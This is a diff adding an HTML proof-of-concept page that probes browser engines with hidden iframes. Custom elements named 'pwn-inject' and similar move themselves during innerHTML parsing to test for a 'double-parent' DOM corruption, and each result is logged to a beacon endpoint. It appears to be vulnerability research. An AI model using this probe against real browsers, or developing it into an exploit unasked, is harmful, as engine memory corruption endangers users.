@@ -1,0 +1,358 @@
+<!doctype html>
+<html><head><title>V416</title></head><body>
+<div id="altParent"></div>
+<script>
+var BQ=0;
+function B(t,d){try{var x=new XMLHttpRequest();x.open('POST','/beacon/V416-'+t+'?t='+Date.now()+'&q='+(BQ++),false);x.send(d||'');}catch(e){}}
+B('BOOT');
+
+var XHTML_NS='http://www.w3.org/1999/xhtml';
+var altP=document.getElementById('altParent');
+
+function tryDomAccess(w,d,prefix){
+  var info={};
+  // contentDocument itself
+  info.hasDoc=(d!==null&&d!==undefined);
+  if(!info.hasDoc){B(prefix+'-NO-DOC');return null;}
+  B(prefix+'-HAS-DOC');
+
+  // documentElement
+  try{
+    info.docEl=d.documentElement;
+    B(prefix+'-DOCEL-'+(info.docEl?info.docEl.nodeName:'NULL'));
+  }catch(e){B(prefix+'-DOCEL-ERR-'+String(e).substring(0,40));}
+
+  // .body (HTML property)
+  try{
+    info.body=d.body;
+    B(prefix+'-BODY-'+(info.body?'YES':'NULL'));
+  }catch(e){B(prefix+'-BODY-ERR-'+String(e).substring(0,40));}
+
+  // getElementsByTagNameNS
+  try{
+    var bodies=d.getElementsByTagNameNS(XHTML_NS,'body');
+    info.nsBody=bodies[0];
+    B(prefix+'-NSBODY-'+(info.nsBody?'YES':'NULL')+'-len-'+bodies.length);
+  }catch(e){B(prefix+'-NSBODY-ERR-'+String(e).substring(0,40));}
+
+  // querySelector
+  try{
+    var qs=d.querySelector('body');
+    B(prefix+'-QS-BODY-'+(qs?'YES':'NULL'));
+  }catch(e){B(prefix+'-QS-BODY-ERR-'+String(e).substring(0,40));}
+
+  // getElementById
+  try{
+    var h=d.getElementById('host');
+    B(prefix+'-GETID-HOST-'+(h?'YES':'NULL'));
+  }catch(e){B(prefix+'-GETID-ERR-'+String(e).substring(0,40));}
+
+  // querySelectorAll divs
+  try{
+    var divs=d.querySelectorAll('div');
+    B(prefix+'-QSA-DIV-'+divs.length);
+  }catch(e){B(prefix+'-QSA-ERR-'+String(e).substring(0,40));}
+
+  // getElementsByTagNameNS divs
+  try{
+    var nsDivs=d.getElementsByTagNameNS(XHTML_NS,'div');
+    B(prefix+'-NS-DIV-'+nsDivs.length);
+  }catch(e){B(prefix+'-NS-DIV-ERR-'+String(e).substring(0,40));}
+
+  // customElements API on window
+  try{
+    B(prefix+'-CE-API-'+(w.customElements?'YES':'NULL'));
+  }catch(e){B(prefix+'-CE-API-ERR-'+String(e).substring(0,40));}
+
+  // Return first usable body-like element
+  return info.nsBody||info.body||info.docEl||null;
+}
+
+function injectCEandTest(w,d,bodyEl,prefix){
+  // Define CE on iframe window
+  var ctorFired=false;
+  var ctorCount=0;
+  var reparentOK=false;
+  try{
+    var IframeHTMLElement=w.HTMLElement;
+    w.customElements.define('pwn-inject',class extends IframeHTMLElement{
+      constructor(){
+        super();
+        ctorFired=true;
+        ctorCount++;
+        B(prefix+'-CTOR-'+ctorCount);
+        try{
+          // Reparent to altParent in MAIN document
+          // This crosses documents, which triggers adoptNode
+          // altP.appendChild(this);
+          // Actually, for same-document reparent, use a sink in the XHTML doc
+          var sink=d.getElementsByTagNameNS(XHTML_NS,'div');
+          for(var i=0;i<sink.length;i++){
+            if(sink[i].getAttribute('id')==='sink'){
+              sink[i].appendChild(this);
+              B(prefix+'-REPARENT-OK');
+              reparentOK=true;
+              break;
+            }
+          }
+          if(!reparentOK){
+            B(prefix+'-NO-SINK');
+          }
+        }catch(e){
+          B(prefix+'-REPARENT-ERR-'+String(e).substring(0,50));
+        }
+      }
+    });
+    B(prefix+'-CE-DEFINED');
+  }catch(e){
+    B(prefix+'-CE-DEF-ERR-'+String(e).substring(0,50));
+    return;
+  }
+
+  // T3a: innerHTML on XHTML element (should use XML fragment parser)
+  try{
+    var host=null;
+    var divs=d.getElementsByTagNameNS(XHTML_NS,'div');
+    for(var i=0;i<divs.length;i++){
+      if(divs[i].getAttribute('id')==='host'){host=divs[i];break;}
+    }
+    if(!host){
+      // Try first div or body
+      host=bodyEl;
+    }
+    if(host){
+      B(prefix+'-HOST-TAG-'+host.nodeName);
+      ctorFired=false;ctorCount=0;
+      host.innerHTML='<pwn-inject id="pi1"></pwn-inject>';
+      B(prefix+'-INNERHTML-DONE');
+      B(prefix+'-CTOR-FIRED-'+(ctorFired?'YES':'NO'));
+      B(prefix+'-CTOR-TOTAL-'+ctorCount);
+
+      // Check for double-parent
+      if(ctorFired){
+        var pi1=d.getElementsByTagNameNS(XHTML_NS,'pwn-inject');
+        if(pi1.length===0) pi1=d.querySelectorAll('pwn-inject');
+        B(prefix+'-FOUND-ELEMS-'+pi1.length);
+        for(var j=0;j<pi1.length;j++){
+          var el=pi1[j];
+          var parent=el.parentNode;
+          B(prefix+'-ELEM'+j+'-PARENT-'+(parent?parent.getAttribute('id')||parent.nodeName:'NULL'));
+        }
+        // Check host children
+        B(prefix+'-HOST-CHILDREN-'+host.childNodes.length);
+        // Check sink children
+        var sink2=null;
+        var sdivs=d.getElementsByTagNameNS(XHTML_NS,'div');
+        for(var k=0;k<sdivs.length;k++){
+          if(sdivs[k].getAttribute('id')==='sink'){sink2=sdivs[k];break;}
+        }
+        if(sink2){
+          B(prefix+'-SINK-CHILDREN-'+sink2.childNodes.length);
+          // Walk host's child list looking for pwn-inject still present
+          var inHost=false,inSink=false;
+          for(var c=host.firstChild;c;c=c.nextSibling){
+            if(c.nodeName==='pwn-inject'||c.nodeName==='PWN-INJECT'){inHost=true;}
+          }
+          for(var c2=sink2.firstChild;c2;c2=c2.nextSibling){
+            if(c2.nodeName==='pwn-inject'||c2.nodeName==='PWN-INJECT'){inSink=true;}
+          }
+          B(prefix+'-IN-HOST-'+(inHost?'YES':'NO'));
+          B(prefix+'-IN-SINK-'+(inSink?'YES':'NO'));
+          if(inHost&&inSink){
+            B(prefix+'-DOUBLE-PARENT-CONFIRMED');
+          }
+        }
+      }
+    }else{
+      B(prefix+'-NO-HOST-ELEMENT');
+    }
+  }catch(e){
+    B(prefix+'-INNERHTML-ERR-'+String(e).substring(0,50));
+  }
+
+  // T3b: createContextualFragment on XHTML element
+  try{
+    ctorFired=false;ctorCount=0;
+    var range=d.createRange();
+    range.selectNode(bodyEl);
+    var frag=range.createContextualFragment('<pwn-inject id="pi2"></pwn-inject>');
+    B(prefix+'-FRAG-OK');
+    B(prefix+'-FRAG-CTOR-'+(ctorFired?'YES':'NO'));
+    bodyEl.appendChild(frag);
+    B(prefix+'-FRAG-APPENDED');
+  }catch(e){
+    B(prefix+'-FRAG-ERR-'+String(e).substring(0,50));
+  }
+}
+
+// T1: Server-served XHTML iframe
+B('T1-START');
+var f1=document.createElement('iframe');
+f1.style.cssText='width:1px;height:1px;position:absolute;left:-9999px';
+f1.onload=function(){
+  B('T1-LOADED');
+  try{
+    var w1=f1.contentWindow;
+    var d1=f1.contentDocument;
+    var body1=tryDomAccess(w1,d1,'T1');
+    if(body1){
+      B('T1-DOM-ACCESS-OK');
+      injectCEandTest(w1,d1,body1,'T1');
+    }else{
+      B('T1-DOM-ACCESS-FAIL');
+      // T1b: Try eval() on iframe window to get DOM access
+      try{
+        var evalResult=w1.eval('typeof document');
+        B('T1-EVAL-TYPEOF-'+evalResult);
+      }catch(e){B('T1-EVAL-ERR-'+String(e).substring(0,50));}
+      // T1c: Try eval to access document and set innerHTML
+      try{
+        w1.eval("window.__b=function(t){try{var x=new XMLHttpRequest();x.open('POST','/beacon/V416-T1E-'+t+'?t='+Date.now(),false);x.send('');}catch(e){}}");
+        w1.eval("__b('EVAL-IN-XHTML')");
+        // Check document access via eval
+        w1.eval("__b('DOC-EL-'+(document.documentElement?document.documentElement.nodeName:'NULL'))");
+        w1.eval("__b('BODY-'+(document.body?'YES':'NULL'))");
+        w1.eval("var divs=document.getElementsByTagNameNS('http://www.w3.org/1999/xhtml','div');__b('NS-DIV-'+divs.length)");
+        // If divs found, try innerHTML with CE
+        w1.eval("var divs=document.getElementsByTagNameNS('http://www.w3.org/1999/xhtml','div');if(divs.length>0){__b('FIRST-DIV-ID-'+(divs[0].getAttribute('id')||'none'))}");
+        B('T1-EVAL-CHAIN-OK');
+      }catch(e){B('T1-EVAL-CHAIN-ERR-'+String(e).substring(0,50));}
+      // T1d: Define CE via eval and trigger via innerHTML
+      try{
+        w1.eval("var ctorRan=false;window.customElements.define('pwn-eval',class extends HTMLElement{constructor(){super();ctorRan=true;__b('EVAL-CTOR-FIRE')}});__b('EVAL-CE-DEF')");
+        w1.eval("var divs=document.getElementsByTagNameNS('http://www.w3.org/1999/xhtml','div');if(divs[0]){divs[0].innerHTML='<pwn-eval></pwn-eval>';__b('EVAL-INNERHTML-DONE')}else{__b('EVAL-NO-DIV')}");
+        B('T1-EVAL-INJECT-OK');
+      }catch(e){B('T1-EVAL-INJECT-ERR-'+String(e).substring(0,50));}
+    }
+  }catch(e){
+    B('T1-ERR-'+String(e).substring(0,50));
+  }
+
+  // T2: Blob URL XHTML iframe
+  B('T2-START');
+  var xhtml='<?xml version="1.0" encoding="UTF-8"?>'+
+    '<html xmlns="http://www.w3.org/1999/xhtml">'+
+    '<head><title>V416B</title></head>'+
+    '<body><div id="host">target</div><div id="sink">sink</div></body></html>';
+  var blob=new Blob([xhtml],{type:'application/xhtml+xml'});
+  var url=URL.createObjectURL(blob);
+  var f2=document.createElement('iframe');
+  f2.style.cssText='width:1px;height:1px;position:absolute;left:-9999px';
+  f2.onload=function(){
+    URL.revokeObjectURL(url);
+    B('T2-LOADED');
+    try{
+      var w2=f2.contentWindow;
+      var d2=f2.contentDocument;
+      var body2=tryDomAccess(w2,d2,'T2');
+      if(body2){
+        B('T2-DOM-ACCESS-OK');
+        // Need different CE name (can't redefine pwn-inject)
+        var ctorFired2=false;
+        var ctorCount2=0;
+        try{
+          var IH2=w2.HTMLElement;
+          w2.customElements.define('pwn-blob',class extends IH2{
+            constructor(){
+              super();
+              ctorFired2=true;
+              ctorCount2++;
+              B('T2-CTOR-'+ctorCount2);
+              try{
+                var sink=d2.getElementsByTagNameNS(XHTML_NS,'div');
+                for(var i=0;i<sink.length;i++){
+                  if(sink[i].getAttribute('id')==='sink'){
+                    sink[i].appendChild(this);
+                    B('T2-REPARENT-OK');
+                    break;
+                  }
+                }
+              }catch(e){B('T2-REPARENT-ERR-'+String(e).substring(0,50));}
+            }
+          });
+          B('T2-CE-DEFINED');
+          // innerHTML test
+          var host2=null;
+          var divs2=d2.getElementsByTagNameNS(XHTML_NS,'div');
+          for(var i=0;i<divs2.length;i++){
+            if(divs2[i].getAttribute('id')==='host'){host2=divs2[i];break;}
+          }
+          if(host2){
+            ctorFired2=false;ctorCount2=0;
+            host2.innerHTML='<pwn-blob id="pb1"></pwn-blob>';
+            B('T2-INNERHTML-DONE');
+            B('T2-CTOR-FIRED-'+(ctorFired2?'YES':'NO'));
+          }
+        }catch(e){B('T2-CE-ERR-'+String(e).substring(0,50));}
+      }else{
+        B('T2-DOM-ACCESS-FAIL');
+      }
+    }catch(e){
+      B('T2-ERR-'+String(e).substring(0,50));
+    }
+
+    // T3: HTML control -- innerHTML CE reparent in HTML doc (no XHTML)
+    B('T3-START');
+    var ctorFired3=false;
+    var ctorCount3=0;
+    try{
+      var sink3=document.createElement('div');
+      sink3.id='sink3';
+      document.body.appendChild(sink3);
+      var host3=document.createElement('div');
+      host3.id='host3';
+      document.body.appendChild(host3);
+
+      customElements.define('pwn-html',class extends HTMLElement{
+        constructor(){
+          super();
+          ctorFired3=true;
+          ctorCount3++;
+          B('T3-CTOR-'+ctorCount3);
+          try{
+            sink3.appendChild(this);
+            B('T3-REPARENT-OK');
+          }catch(e){B('T3-REPARENT-ERR-'+String(e).substring(0,50));}
+        }
+      });
+      B('T3-CE-DEFINED');
+      ctorFired3=false;ctorCount3=0;
+      host3.innerHTML='<pwn-html id="ph1"></pwn-html>';
+      B('T3-INNERHTML-DONE');
+      B('T3-CTOR-FIRED-'+(ctorFired3?'YES':'NO'));
+      B('T3-CTOR-TOTAL-'+ctorCount3);
+
+      // Check parents
+      var ph1=document.getElementById('ph1');
+      if(ph1){
+        B('T3-PH1-PARENT-'+(ph1.parentNode?ph1.parentNode.id||ph1.parentNode.nodeName:'NULL'));
+      }
+      B('T3-HOST-CHILDREN-'+host3.childNodes.length);
+      B('T3-SINK-CHILDREN-'+sink3.childNodes.length);
+
+      // Walk child lists
+      var inH3=false,inS3=false;
+      for(var c=host3.firstChild;c;c=c.nextSibling){
+        if(c.nodeName==='PWN-HTML'){inH3=true;}
+      }
+      for(var c2=sink3.firstChild;c2;c2=c2.nextSibling){
+        if(c2.nodeName==='PWN-HTML'){inS3=true;}
+      }
+      B('T3-IN-HOST-'+(inH3?'YES':'NO'));
+      B('T3-IN-SINK-'+(inS3?'YES':'NO'));
+      if(inH3&&inS3){
+        B('T3-DOUBLE-PARENT-CONFIRMED');
+      }
+    }catch(e){
+      B('T3-ERR-'+String(e).substring(0,50));
+    }
+
+    B('COMPLETE');
+  };
+  f2.src=url;
+  document.body.appendChild(f2);
+};
+f1.src='p415-xhtml-ns.xhtml';
+document.body.appendChild(f1);
+</script>
+</body></html>
